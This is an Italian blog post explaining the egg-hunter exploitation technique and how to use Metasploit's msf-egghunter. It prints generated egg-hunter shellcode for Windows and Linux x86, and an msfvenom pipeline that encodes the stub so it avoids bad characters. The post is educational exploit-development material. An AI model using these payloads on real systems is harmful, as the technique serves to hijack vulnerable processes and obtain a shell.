---
layout: post
title: "Diamo un'occhiata a msf-egghunter"
author: thesp0nge
featured: true
category: [post]
tags: [egghunter, exploit, offensive, payload, assembly]
image:
  feature: eggs.jpg
comments: true
share: true
---

Lo scorso febbraio, su [The Armored
Code](https://armoredcode.com/blog/a-closer-look-to-msf-egghunter/) ho scritto
un post che parlava di msf-egghunter, lo strumento distribuito insieme a
Metasploit per scrivere un egg hunter.

Lo scorso anno, per la certificazione SLAE, mi [ero già
imbattuto](https://codiceinsicuro.it/slae/assignment-3-an-egg-hunter-journey/)
in questa tecnica che ho trovato immediatamente affascinante.

Stiamo parlando di sviluppo di un exploit. Avete, in qualche modo, forzato la
modifica del flusso di esecuzione del vostro programma vulnerabile (attraverso
la sovrascrittura dell'EIP o attraverso la Structure Exception Handler, nel
caso il target sia Windows) e siete nel punto dove dovete piazzare il vostro
shellcode. A questo punto sorge un problema, il buffer nel quale siete è troppo
piccolo per contenere una bind shell, una reverse shell o qualsiasi cosa utile
a darvi un prompt.

Che fare? Semplice; andate a studiare il paper di Matt Miller, ["Safetly
Searching Process Virtual Address
Space"](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) e poi
tornate qui.

Fatto? Molto bene. L'idea alla base di questa tecnica è quella di piazzare il
nostro shellcode in un punto qualsiasi della memoria del processo da attaccare.
Lo shellcode avrà in testa una sequenza di 4 byte, ripetuta 2 volte per evitare
falsi positivi, che sarà interpretata come un indicatore di inizio per il
nostro payload. Il codice dell'egg-hunter, che andremo a piazzare nel piccolo
buffer di cui parlavamo prima, avrà il compito di cercare nella memoria del
processo vittima, i 4 byte di inizio payload e, una volta trovati, far saltare
l'esecuzione a quel punto in memoria.

Per la SLAE
[scrissi](https://github.com/thesp0nge/SLAE/tree/master/Assignment_3) un
semplice codice assembler che realizzava un egg-hunter. Oggi vediamo uno
strumento messo a disposizione dal framework Metasploit:
[msf-egghunter](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/egghunter.rb).

{%highlight sh%}
[root:~/src/hacking/toolbox/utils]# msf-egghunter -h
Usage: msf-egghunter [options]
Example: msf-egghunter -f python -e W00T

Specific options:
    -f, --format <String>            See --list-formats for a list of supported output formats
    -b, --badchars <String>          (Optional) Bad characters to avoid for the egg
    -e, --egg <String>               The egg (Please give 4 bytes)
    -p, --platform <String>          (Optional) Platform
        --startreg <String>          (Optional) The starting register
        --forward                    (Optional) To search forward
        --depreg <String>            (Optional) The DEP register
        --depdest <String>           (Optional) The DEP destination
        --depsize <Integer>          (Optional) The DEP size
        --depmethod <String>         (Optional) The DEP method to use (virtualprotect/virtualalloc/copy/copy_size)
    -a, --arch <String>              (Optional) Architecture
        --list-formats               List all supported output formats
    -v, --var-name <name>            (Optional) Specify a custom variable name to use for certain output formats
    -h, --help                       Show this message

{%endhighlight%}

## Semplice utilizzo del tool

L'utilizzo base di msf-egghunter è quello di scegliere la piattaforma (windows
o linux) e l'architettura (a 32 o 64 bit). Unico parametro mandatorio sarà
l'EGG da utilizzare per marcare l'inizio del nostro payload; useremo la stringa
'BEEF' allo scopo.

{% highlight sh %}
[root:~/src/hacking/toolbox/utils]# msf-egghunter -p windows -a x86 -f python -e BEEF
buf =  ""
buf += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
buf += "\x05\x5a\x74\xef\xb8\x42\x45\x45\x46\x89\xd7\xaf\x75"
buf += "\xea\xaf\x75\xe7\xff\xe7"

[root:~/src/hacking/toolbox/utils]# msf-egghunter -p linux -a x86 -f python -e BEEF
buf =  ""
buf += "\xfc\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c"
buf += "\xf2\x74\xf1\xb8\x42\x45\x45\x46\x89\xcf\xaf\x75\xec"
buf += "\xaf\x75\xe9\xff\xe7"
{% endhighlight %}

## Evitare i bad characters

Quando stiamo scrivendo un exploit, siamo nella condizione di non poter
utilizzare alcuni caratteri nel nostro payload. Magari a causa di una routine
di filtro, alcuni codici ascii utilizzati nel nostro payload potrebbero non
essere gestiti correttamente dal programma vittima e non copiati nelle proprie
zone di memoria.

Vanno quindi rimossi e sembra che il parametro '-b' sia lì proprio per quello
peccato che, almeno nella versione di Metasploit 5.0.6-dev, non funzioni.
Supponiamo io debba creare uno shellcode per Linux, architettura a 32 bit e
voglia usare sempre 'BEEF' come egg.

{%highlight sh%}
[root:~/src/hacking/toolbox/utils]# msf-egghunter -p linux -a x86 -f python -e BEEF -b '\x66'
buf =  ""
buf += "\xfc\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c"
buf += "\xf2\x74\xf1\xb8\x42\x45\x45\x46\x89\xcf\xaf\x75\xec"
buf += "\xaf\x75\xe9\xff\xe7"
{%endhighlight%}

Come si può vedere, il nostro carattere '\x66' è ancora lì al suo posto.
Quindi? Quindi chiedo aiuto a msfvenom, strumento principe per la generazione
dei payload e che è in grado di fare delle trasformazioni ad un shellcode
arbitrario passato attraverso lo standard input. 

{%highlight sh%}
[root:~/src/hacking/toolbox/utils]# msf-egghunter -p linux -a x86 -e BEEF -f raw | msfvenom -p - --platform linux -a x86 -b '\x66' -f python

Attempting to read payload from STDIN...
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 58 (iteration=0)
x86/shikata_ga_nai chosen with final size 58
Payload size: 58 bytes
Final size of python file: 292 bytes
buf =  ""
buf += "\xd9\xe9\xbd\x34\x49\xad\xb8\xd9\x74\x24\xf4\x5e\x29"
buf += "\xc9\xb1\x08\x83\xc6\x04\x31\x6e\x16\x03\x6e\x16\xe2"
buf += "\xc1\xb5\xcb\x39\xe0\xb9\x1b\x7b\x98\x06\x7c\xb6\xdc"
buf += "\xb5\x8e\x3c\x2d\x7d\x2c\xf8\x88\x38\x38\xcd\xbd\xb0"
buf += "\xd6\x7d\xb4\xd3\xd8\x65"

{%endhighlight%}

Ed ecco qui, il carattere '\x66' è sparito. Quello che vi consiglio è di usare
msfvenom per tutto quello che riguarda l'encoding e la trasformazione del
vostro egg-hunter in pipe ad msf-egghunter.

## Il cuore

Il cuore del codice di msf-egghunter è nella libreria rex-exploit sviluppata da Rapid7, il cui codice è disponibile [qui su GitHub](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/egghunter.rb).

Dal codice possiamo leggere nei commenti i miglioramenti fatti rispetto al
lavoro di Miller. Interessante il codice per [disabilitare il
DEP]((https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/)
scritto da corelandc0d3r.

## Off by one

Per avere un esempio pratico, vi do il link di questo exploit che ho scritto
per [Base64 Decoder 1.1.2](https://www.exploit-db.com/exploits/46625) mostra
msf-egghunter in azione. A me questa tecnica piace un sacco, è divertente
pensare al processo vittima che cerca in memoria il codice per bucarsi, lo
esegue e ti restituisce una shell.

Enjoy it!
